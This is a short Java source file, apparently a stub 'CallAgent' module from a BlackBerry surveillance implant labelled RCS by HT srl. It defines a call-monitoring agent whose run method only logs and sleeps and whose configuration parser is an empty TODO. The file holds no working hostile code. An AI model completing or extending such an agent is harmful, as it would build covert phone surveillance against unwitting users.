/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CallAgent extends Agent {
    private static Debug debug = new Debug("CallAgent", DebugLevel.VERBOSE);

    public CallAgent(int AgentStatus) {
        super(Agent.AGENT_CALL, AgentStatus, true);
    }

    protected CallAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");

        this.SleepUntilStopped();
    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
